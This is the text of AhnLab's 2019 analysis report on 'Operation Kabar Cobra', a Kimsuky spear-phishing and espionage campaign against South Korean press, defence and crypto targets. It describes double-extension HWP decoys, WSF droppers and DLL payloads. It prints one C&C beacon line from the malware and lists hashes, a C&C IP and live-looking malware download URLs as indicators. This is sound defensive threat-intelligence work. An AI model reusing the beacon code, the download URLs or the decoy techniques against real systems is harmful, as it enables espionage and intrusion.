{
    "title": "[Analysis_Report]Operation Kabar Cobra (1)",
    "text": "2019. 02. 28  \n \nOperation Kabar Cobra  \nTenacious cyber -espionage campaign by Kimsuky Group    \nAhnLab Security Emergency -response Center (ASEC)  \n220, Pangyoyeok -ro, Bundang -gu, Seongnam -si, Gyeonggi -do, South Korea  \nTel: +82 -31-722-8000 | Fax: +82 -31-722-8901 | www.ahnlab.com   |  © AhnLab, Inc. All rights reserved.  \n \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           2 \nTable of Content  \n \nExecutive Summary  ................................ ................................ ................................ ................................ ...........  3 \n \nIntroduction: Operation Kabar Cobra  ................................ ................................ ................................ .................  3 \n \nAnalysis of the Malware  ................................ ................................ ................................ ................................ ..... 4 \n1. Malware Functions and Operations ................................ ................................ ................................ ........  4 \n(1) 2.wsf  ................................ ................................ ................................ ................................ ...............  5 \n(2) 3.wsf  ................................ ................................ ................................ ................................ ...............  6 \n2. Malware Profiling  ................................ ................................ ................................ ................................ .... 8 \n(1) Malware distribution method  ................................ ................................ ................................ ..........  8 \n(2) Malware source and C&C server  ................................ ................................ ................................ ... 9 \n(3) Shellcodes  ................................ ................................ ................................ ................................ ..... 9 \n(4) Operational process of offspri ng malware  ................................ ................................ ...................  10 \n \nConclusion  ................................ ................................ ................................ ................................ ........................  11 \n \nAhnLab’s Response  ................................ ................................ ................................ ................................ ..........  11 \n \nIoC (Indicators of Compromise)  ................................ ................................ ................................ .......................  12 \n \n※ Appendix  ................................ ................................ ................................ ................................ .....................  15 \n \n  Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           3 \nExecutive Summary  \nOn January 7, 2019, a spear -phishing email with a malicious attachment was sent to members of the Ministry \nof Unification press corps. The perpetrators behind the mail and malware are assumed to be the so -called \nKimsuky threat group  or Kimsuky group .  \n \nKimsuky group was first identified  in 2013, when the Russian security company Kaspersky Lab released a \nreport analyzing a cyber -espionage campaign by the group. The name derives from the email account, \n“Kimsukyang ,” which was used as drop -point for stolen data  at the time.   \n \nSince 2013, Kimsuky group has continu ed a cyber - attack  campaign against  government organizations  and \ndefense -related agencies in South Korea as well as institutions and corporations related to South Korea’s \nengagement with North Korea . After the January 2019 spear -phishing attack, more activity by the  Kimsuky \ngroup was detected in February 2019 during the period ahead of the second U.S.-North Korea summit  in Hanoi.  \n \nIn the meantime, notable signs point to an expanded ta rget list that includes financial firms and cryptocurrency  \norganizations along with the political sector. As North Korea’s economic situation continues to deteriorate due \nto ongoing sanctions, the attackers appear to be aiming for financial gains in additi on to its political agenda.  \n \nThis report presents a  detailed  analysis on the series of recent attacks,  of which the Kimsuky  group  has been \nsuspected, and the reasons for concluding that the group is the perpetrator.  \n \n \n \n \nIntroduction: Operation Kabar Cobra  \nWith the Kimsuky group mounting a sustained campaign of attacks against South Korea’s defense -related \norganizations and media companies, the attackers were  recently found targeting a number of  enterprises \nincluding those dealing in cryptocurrencies f or financial gain. A spate of malware was distributed with the file \nname “Cobra” and a mutex called “KABAR” were identified in several of the attacks.   \n \n \nFigure 1 . Mutex string included in the malicious code  \nBased on these findings, the  security research ers at  AhnLab Security Emergency Response Center (ASEC ) \nsuspect that the recent wave of attacks  originated from  the Kimsuky  group  and have named it “Operation \nKabar Cobra .” \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           4 \nAnalysis of the Malware  \n1. Malware Functions and Operations  \nTable 1 provides a summary of verified malware attacks (droppers) and their targets by Kimsuky from \nDecember 2018 to January 2019 . In order to deceive its victims, the attacker used a Hancom Office  file (.hwp), \nwhich is a widely used word processing program in South Korea. Note that the date of discovery of the files in \nTable 1 and the actual date of their drop may be different.  \n \nDate  Decoy file  File name  Target  \n2018 -12-26 Hancom \nOffice file  \n(.hwp)  2019 사업계획서 .hwp{ blank }.exe  \n(The file name can be translated to  “2019 \nBusiness plan”)  Defense -related organization  \n(ROTC)  \n2019 -01-07 Hancom \nOffice file  \n(.hwp)  미디어  권력이동 ⑥-넷플렉스 , 유튜\n브.hwp{ blank }.exe  \n(The file name can be translated to  \n“Shifting the power of media ⑥-Netflix, \nYouTube”)  Media  \n(Ministry of Unification press \ncorps)  \n2019 -01-20 Hancom \nOffice file  \n(.hwp)  중국-연구자료 .hwp{ blank }.scr \n(The file name can be translated to  \n“Research of China - Reference \nmaterials ”) Unknow n \nTable 1 . Dropper file name and type for each target  \n \n \nThe attacker disguis ed the dropper with a  Hancom Office file icon and used a double extension including .hwp \nfor the file name. As shown in Table 1, a blank was inserted between the two extensions to make it difficult to \nrecognize the files as an executabl e (.exe) or screen saver (.scr). Clicking on the files displays content  that \nappears to be a regular .hwp document file being opened. To add a further layer of deception, the file ’s content \nis disguised so as to appear to reflect a topic that could reasona bly appear in the target’s regular line of work.  \n \nAn in-depth analysis of the malware that was sent out in the early morning hours of January 7 to the Ministry \nof Unification (MoU) press corps is shown in Table 1; it explains features and functions of the Operation Kabar \nCobra malware and how they operate.  \n \nThe email sent to members of the MoU press corps bears the subject “TF reference materials” with a zipped \nfile attachment titled  “TF 참고.zip” ( The file name can be translated to  “TF reference.zip”). As noted in Figure Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           5 \n2, the attachment contains a seemingly ordinary PDF file and a malicious file with a double extension \n(*.hwp[blank].exe)  \n \n \nFigure 2 . Malware distributed to press corps members  \n \nThis malware is identical in form to the attack against defense institutions in Table 1, with both cases involving \nmalware disguised as a Hancom Office file (.hwp) and compressed with self -extraction (WinRAR SFX). \nRunning the zipped file will extract the f ile and run the malware, which then proceeds to initiate the  actual \nmalicious activity . In addition, C&C information is acquired from the attacker’s Google Drive. The fun ctions of \nthe malware shown in Figure 2 are as follows:  \n \n(1) 2.wsf  \n2.wsf downloads a nd runs additional malware. The necessary C&C information is downloaded from the \nattacker’s Google Drive storage.  \n \nFigure 3 . Download ing C&C information from the attacker’s Google Drive address  \n \nThe file stored in the attac ker’s Google Drive is shown in Figure 4, and includes the C&C information for \ndownloading the malware. The file could be altered at any time by the attacker. Malware that acts as a dropper \nusually contain hardcoded C&C information. If the C&C server is shut down, the attacker then has t o go through \nthe hassle of rewriting and distributing new malware. In this instance, however, even if the C&C server is \nblocked , the attacker merely needs to change the file in the Google Drive, from which the malware can receive \ninstructions on connecting  to a new C&C server and continue its nefarious actions.  \n \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           6 \n \nFigure 4 . File stored in the attacker’s Google Drive  \n \nNote that the email address (countine.protector.mail@gmail.com) shown in the lower part of Figure 4 ha d been \npreviously used to send phishing  email. An advisory notice related to this was sent out in 2018 by the Education \nCyber Security Center (ECSC)  in South Korea . \n \nThe malware (brave.ct) downloaded by 2.wsf is decrypted in the process shown i n Figure 5, and the file \nFreedom.dll created in the  process is executed via PowerShell. If the infected PC is running in a 64 -bit \nWindows environment, another file named AhnLabMon.dll is created.  \n \n \nFigure  5. Executing the additional ly-downloaded malware  \n \n(2) 3.wsf  \nLike 2.wsf, 3.wsf downloads C&C information from the file stored in the attacker’s Google Drive. However, \nwhile 2.wsf serves as a dropper that downloads and runs additional malware, 3.wsf carries out a variety of \nfunctions including deleting , downloading, and uploading files ; running com mands, transmitting logs,  and \nupdating 3.wsf itself ; and BASE64 encrypting and decrypting the files being sent to and from the C&C server.  \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           7 \nConnecting to the C&C server was still available when AhnLab’s researchers began their investigation, which \nhelped them understand how 3.wsf communicates with the C&C server and what commands  are sent. Before \ncarrying out its malicious activities, 3.wsf first receives its version information from the C&C server and \ncompares it to its own version number  being exe cuted on the infected PC. If the version on the C&C server is \nhigher , the latest version of 3.wsf is downloaded and executed, as shown in Figure 6. \n \n \nFigure 6. Comparing and updating the 3.wsf file’s version  \n \nIn the particular case that AhnLab investigate d, 3.wsf  downloaded its 1.2 version from the C&C server as \nshown in Figure 7.  \n \n \nFigure  7. The version information  of 3.wsf  downloaded  from the C&C server  \n \nAfter checking the version information, 3.wsf receives commands from the C&C server and writes the f ollowing \nparameters to carry out its functions.  It sends a GET request to the C&C server , then  receives and executes \nthe command encrypted in BASE64.  \n \n- Parameters when connecting to  the C&C server for commands:  \nxhr.open(GET,serverurl+/board.php?m=+MAC_ADDR+&v=+VERSION+|+TIMEOUT,false);      \nxhr.send();  \n \nAs shown above, t he attacker includes the version  of 3.wsf in the parameters  sent to the C&C server in order \nto check the current version of 3.wsf running on the  infected PC  so that the attacker can identify  how many  \nsystems are infected  by each version.   \n \nFigure 8 shows part of the communication taking place be tween 3.wsf and its C&C server; it reveals how 3.wsf \nreceives and execute the commands to download the list.dll file  from the C&C server . However, 3.wsf does not \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           8 \ncontain the codes for executing the  downloaded  list.dll (or Cobra.dll).  Instead, Freedom.dll (or AhnLabMon.dll), \nwhich is downloaded by 2.wsf, is confirmed to download and execute the same list.dll (Cobra.dll). Freedom.dll \n(AhnLabMon.dll) downloaded by 2.wsf  calls DeleteUrlCacheEntryA() function to eliminate any trace that it \ndownloaded the list.dll file  in order to prevent being tracked .  \n \n  \nFigure 8. Downloading the malware via C&C server communication  \n \nThe list.dll (or Cobra.dll) file downloaded via communication with C&C server as shown in Figure 8 collects the \nsystem information and a list of folders and files, and copies compressed files  in the infected system . With the \ncollected inform ation, the attacker is able to determine whether the infected  PC is a system that analyzes \nmalware. If the infected PC is confirmed to be a system that analyzes malware, then the malware shuts down \nthe analysis program and plant s false flags in order to el ude tracking  \n \n \n2. Malware Profiling  \nThere were attacks targeting an  apparel company and cryptocurrencies  in South Korea while the attack against \nmilitary -related organizations and the media industry  listed in Table 1 were taking place . These attacks may \nseem unrelated; however, similarities in malware were identified  including the fact that  the malware were \ndistributed from the same C&C server. The analysis of the timestamps in the related files also revealed that \nthe attackers have been periodically creati ng variant strains since at least two years ago.  \nThrough malware profiling, AhnLab’s security researchers  reveal ed that the attacks against the apparel  \ncompan y and cryptocurrencies were indeed related to Operation Kabar Cobra, and that Kimsuky was behind \nthese attacks. A considerable body of evidence was accumulated, of which only the key  summary is provided \nbelow.  \n \n(1) Malware distribution method  \nThe malware are distributed in similar ways. A disguised document to lure the victim is accompanied by \nmalicious scripts  in the form of a WinRAR SFX (self -extracting archive). In the attacks targeting \ncryptocurrencies, for example, a file disguised as an Excel file containing Ethereu m transactions was used; in \nthe attacks against the apparel compan y, an Excel file masquerading as a quote and written in simplified \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           9 \nChinese was employed, as shown in Figure 9. \n \n \nFigure 9. Excel file disguised as a quote  \n \nHowever, differences were spotte d in how the C&C information was downloaded. In the attacks against military  \nagencies and the media industry , C&C information was downloaded from the attacker’s Google Drive; in the \nattack against cryptos, downloading C&C information with the malicious scr ipt (2.wsf, 3.wsf) was skipped and \nthe C&C server was listed in a variable named server  url. \n \n(2) Malware source and C&C server  \nThe source of the malware and the C&C server , which have been identified by AhnLab’s security researchers, \npoint to a single IP  that is connected to a number of URLs. These URLs hijack the  well-known  names of  Google , \nMicrosoft , and representative portals and  key cyber  security companies in South Korea, including AhnLab. The \nattacker used these URLs to distribute malware or as phis hing sites and C&C servers.  \n \n(3) Shellcodes  \nA comparison of the disguised  malicious Hancom Office files used by Kimsuky in the 2014 and in 2018 attack s \nrevealed the fact that the same shellcodes exist in both files as shown in Figure 10. The upper part of Figure \n10 is the HWP file distributed in 2014, which has a file name that translates to “2014_  Design changes of Hanul \nnuclear reactor No. 1 and 2” in Korean; the bottom part of the Figure 10 is the HWP file distributed in 2018, \nwhich has the file name tha t translates to “ 2018_Declaration of the end of  Korean  war.”  \n \nThe left section in Figure 10  compare s the two shellcodes ; the grey area indicat es the overlapping code s of \nboth files, indicating these two malware have the same shellcodes.  \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           10 \n \nFigure  10. Shellcodes of the malicious files from 2014 (top) and 2018 (bottom)  \n \n(4) Operational process of offspring malware  \nThe disguised malicious Hancom Office files created  in 2017 and 2018 both create d a malicious file named \ncore.dll. Both core.dll files used d ifferent files to run themselves, rundll32.exe and regsvr32.exe  respectively, \nbut the codes are identical . In addition, both core.dll’s shut down the process if the program used to run \nthemselves  was determined to be notepad.exe.  \n \nThe decryption key patte rn that the both core.dll’s used to decrypt the encrypted string  shows they are identical: \n32-byte patterns in 4 -byte components. Also, the codes show that both core.dll’s used to decrypt  the encrypted \nstring  are very similar though they are not completely  identical. Moreover, both core.dll’s have malicious scripts \nthat make the code s and the way they execute are identical to those  attacks examined above.  \n \n  \nAnalysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           11 \nConclusion  \nThere following is  clear evidence that Kimsuky is responsible for  a series of recent attacks targeting South \nKorean companies and institutions : the identical shellcode s; malware that share the same code s and operating \nprocesses; and  the generation of identical additional malware and identical IP for connecting to the same C&C \nserver . In addition to evading detection by security solutions with encrypted files, Kimsuky uses various \ntechniques  such as self -deletion and variable file names to elude security  researchers.  \n \nYet, there is a noticeable factor to which we should pa y attention. Kimsuky, having showed such deviousness, \nused the same Hancom Office vulnerabilities and shellcode s used in  the earlier 2014 attacks . It reveals that \nKimsuky is  well aware of the fact that targets continue to use outdated version s of Hancom Of fice without \napplying basic security updates.  \nIn this regard, it is highly recommended that organizations and companies  be vigilant in keeping their assets \nupdated . In addition, organizations and companies  should obtain full visibility into  their internal  system s to \ndetect and track  security breaches .  \n \n \n \n \n \n \n \nAhnLab’s Response  \nThe Operation Karbar Cobra relevant aliases identified by V3, AhnLab’s anti -virus program, are as below:  \nMD5  V3 alias  V3 engine version  \n20301fdd013c836039b8cfe0d100a1d7  Trojan/Win32.Agent  2019.01.21.02  \nb02f3881321f0912b2ae3f27498c448f  Trojan/Win32.XwDoor  2014.01.28.03  \ncd705902ea42d0de2a8456b055c3bb87  Malware/Win32.Possible_scrdl  2019.02.02.01  \n54783422cfd7029a26a3f3f5e9087d8a  HWP/Exploit  2014.12.10.06  \nb7359ae1a83323d3671e7c3a63ce7bf1  OLE/Cve -2017 -11882.Gen  2018.04.05.03  \nb994bd755e034d2218f8a3f70e91a165  Backdoor/Win32.Agent  2019.01.07.09  \nba89337af43f0b07a35cc892ac95112a  Backdoor/Win32.Akdoor  2017.07.13.00  \n874c0ec36be15fe3403f3abad6ecea75  Downloader/Win32.Agent  2017.06.20.00  \nab73b1395938c48d62b7eeb5c9f3409d  Win-Trojan/Agent.5248512  2013.09.12.00  \nf22db1e3ea74af791e34ad5aa0297664  JS/Agent  2018.05.31.03  \n11fc4829c2fff9fb240acbd71c60fc67  Dropper/Win32.TeamRat  2014.04.10.01  \n6106449779d453be4ae28d89f207e921  Trojan/Win32.Agent  2019.01.07.07  Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           12 \n95410a32a76aecb099af53255bb90737  Backdoor/Win32.Akdoor  2017.05.26.03  \ndc1196876d9a59ab477ebc62d07a255e  Malware/Win32.Possible_scrdl  2019.02.02.01  \n0eb739c8faf77dae0546ff447ad06038  Dropper/Win32.Agent  2019.01.07.07  \n242c31d0ce2109fdface788663e90f49  Trojan/Win32.Agent  2019.01.07.07  \n66b73fba4e47b3184edd75b0ce9cf928  Trojan/Win32.Agent  2019.01.21.02  \n71ec829db01818d305552ec4ebb1c258  Backdoor/Win32.Agent  2019.01.08.00  \n9c3396aa94083916227201bf1396a2ca  Dropper/Win32.Agent  2019.01.07.07  \n1dfe826f71c20ff04987a9160c177e46  Backdoor/Win32.Agent  2019.01.07.09  \n48d9e625ea3efbcbef3963c8714544a7  HWP/Exploit  2019.02.07.09  \n4de21c3af64b3b605446278de92dfff4  Trojan/Win32.Akdoor  2018.05.30.00  \nb49bbc11ed000211a5af7eb35f596886  VBS/Exploit  2019.02.12.00  \n8332be776617364c16868c1ad6b4efe7  HWP/Exploit  2018.05.23.04  \n9d685308d3125e14287ecb7fbe5fcd37  Backdoor/Win32.Agent  2019.01.07.09  \nbb42e6649d927899c816cc04c2bffc06  Trojan/Win32.Agent  2017.06.12.00  \n2fdf23367c604511d019a6914c50bc0b  Trojan/Win32.Agent  2017.06.12.00  \nAEA8D3002132094A58D5189A8E886CF8  HWP/Exploit  2017.05.31.03  \n08523230E221246BB59CDE7C3E8363C7  Trojan/Win32.Akdoor  2016.09.28.01  \n2f26f3a883aeca9a11769664fc7d4750  Backdoor/Win32.Akdoor  2017.05.26.03  \n566cc6129dc887629a7131821c7547e5  Trojan/Win32.Agent  2017.06.12.00  \na45ba001c3abee03bda49c6816d9a17c  Backdoor/Win32.Agent  2019.01.08.00  \n \n \n \n \n \n \nIoC (Indicators of Compromise)  \n1. MD5  \n0eb739c8faf77dae0546ff447ad06038  - 2019 사업계획서 .hwp{공백}.exe (The file name can be translated \nto “2019 Business plan”)  \n9c3396aa94083916227201bf1396a2ca  - 미디어  권력이동 ⑥-넷플렉스 , 유튜브 .hwp{공백}.exe (The file \nname can be translated to  “Shifting the power of media ⑥-Netflix, YouTube”)  \n20301fdd013c836039b8cfe0d100a1d7  - 중국-연구자료 .hwp{공백}.scr (The file name can be translated to  \n“Research of China - Reference materials”)  \ndc1196876d9a59ab477ebc62d07a255e  - AR.xls{blank}.exe  \ncd705902ea42d0de2a8456b055c3bb87  -{unknown}.exe  Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           13 \nFreedom.dll & AhnLabM on.dll & AlyacMonitor.db  \n242c31d0ce2109fdface788663e90f49  \n6106449779d453be4ae28d89f207e921  \n66b73fba4e47b3184edd75b0ce9cf928  \nCobra.dll  \nb994bd755e034d2218f8a3f70e91a165  \n1DFE826F71C20FF04987A9160C177E46  \n1A082A388A285E7FC4541124794F3910  \nsecu32_init.inf   \n71EC829DB01818D305552EC4EBB1C258  \n2fdf23367c604511d019a6914c50bc0b  \nprivate32.db   \n566cc6129dc887629a7131821c7547e5  \n9D685308D3125E14287ECB7FBE5FCD37  \ncore.dll  \nbb42e6649d927899c816cc04c2bffc06  \n874C0EC36BE15FE3403F3ABAD6ECEA75  \n4DE21C3AF64B3B605446278DE92DFFF4  \n95410A32A76AECB099AF53255BB90737  \ntvengine.dll a45ba001c3abee03bda49c6816d9a17c  \nariaK.dll 0a50827a4897a43a882c8d3c691d943d  \nIECheck.dll 02dae3046d1669a55785ba935b0e3f0b  \n45D3.tmp ba89337af43f0b07a35cc892ac95112a  \nMsMpQhp.exe 74c3011b6980bea23d119822d979a364  \nTeamViewer  \nab73b1395938c48d62b7eeb5c9f3409d  \nb02f3881321f0912b2ae3f27498c448f  \n11fc4829c2fff9fb240acbd71c60fc67  \n54783422CFD7029A26A3F3F5E9087D8A  -2014 한울 1,2 호기 설계 변경 사항.hwp (The file name can \nbe translated to  “2014 Design changes of Hanul nuclear reactor N o. 1 and 2”)  \n8332be776617364c16868c1ad6b4efe7  - 2018 종전선언 .hwp (The file name can be translated to  “2018 \nDeclaration of the end of Korean war”)  \nfontchk.jse f22db1e3ea74af791e34ad5aa0297664  \n48d9e625ea3efbcbef3963c8714544a7  - 2월 1주차 국제안보군사정세 .hwp (The file name can be \ntranslated to  “Internationally military affair for 1st week in February”)  \nB49BBC11ED000211A5AF7EB35F596886  – exploited IE vulnerability CVE-2018 -8174  \nAEA8D3002132094A58D5189A8E886CF8  - 2016년 제46차 원내대책회의  모두발언 .hwp (The file name \ncan be translated  to “Opening statement for the 46th Chamber 2016”)  \n0x0ED6D109 -0xED81000.mem.pe.exe 08523230E221246BB59CDE7C3E8363C7  \nhwpkor.dll 2f26f3a883aeca9a11769664fc7d4750  \n \n \n2. C&C and URL \nIP URL Full URL \n185.224.138.29 \n(NE) navem -rnail.hol.es  navem -rnail.hol.es/est/down/msofficeupdate64  \nmyaccounnts -goggle.esy.es   \nbmail -or-kr.esy.es   \naiyac -updaite.hol.es  aiyac -updaite.hol.es/est/down/alyacmonitor64  \naiyac -updaite.hol.es/est/down/msofficeupdate64  Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           14 \nrnyacount -jpadmin.hol.es  rnyacount -jpadmin.hol.es/est/down/msofficeupdate64  \nrnyacount -jpadmin.hol.es/est/down/fw.a  \nms-performance.hol.es  ms-performance.hol.es/mysite/down/msperformancecheck.b  \nms-performance.hol.es/mysite/down/msperformancecheck64  \nsuppcrt -seourity.esy.es   \nahnniab.esy.es  ahnniab.esy.es/w/down/alyacmonitor.a  \nahnniab.esy.es/w/down/tvEngine.dll  \ndaum -safety -team.esy.es   \nmyacccounts -goggle.esy.es   \nmyacccount -goggle.esy.es   \nnav-mail.hol.es   \nmail-support.esy.es   \nmy-homework.890m.com  my-homework.890m.com/gnu/download/tvEngine.dll  \nmy-homework.890m.com/gnu/download/list.dll  \nnid-mail.hol.es   \nnid-mail.esy.es  nid-mail.esy.es/gnu//download/tmp.dll  \nnid-mail.esy.es/gnu//download/notepad64.exe  \nnid-mail.esy.es/bbs/data/tmp/x64/wall.cab  \nnid-mail.esy.es/bbs/data/tmp/logger/private32  \nnid-mail.esy.es/bbs/data/tmp/logger/private64  \nnid-mail.esy.es/bbs/data/tmp/logger/secu32_init  \nnid-mail.esy.es/bbs/data/tmp/logger/secu64_init  \nnid-mail.pe.hu   \nnewsea36 -chol.esy.es   \nacount -qooqle.pe.hu   \nmyprofileacc.pe.hu   \ncustomer -center.esy.es   \nneed -nver.hol.es   \ndaum -settting.hol.es   \nnid-never.pe.hu   \nnid-naver.hol.es   \n \n \n \n \n \n \n Analysis Report_Operation Kabar Cobra  \n© AhnLab, Inc. All rights reserved.                                                                                           15 \n※ Appendix  \nSpecial thanks to:  \nThere was considerable assistance and feedback from experts in the creation of this analysis report, to whom \nthanks are due:  \n▪ Tae-hwan Park, Tae -yeon Yang, Seon -ho Lee, and Min -seok Cha at  AhnLab  security emergency response \ncenter (ASEC)  \n▪ Jong - hyun  Moon at ESTsecurity  \n▪ Min-chang  Jang  at Korea Financial Security Institute  \n▪ Byeong -jae Kim at Korea Internet & Security Agency (KISA)  \n \n \n "
}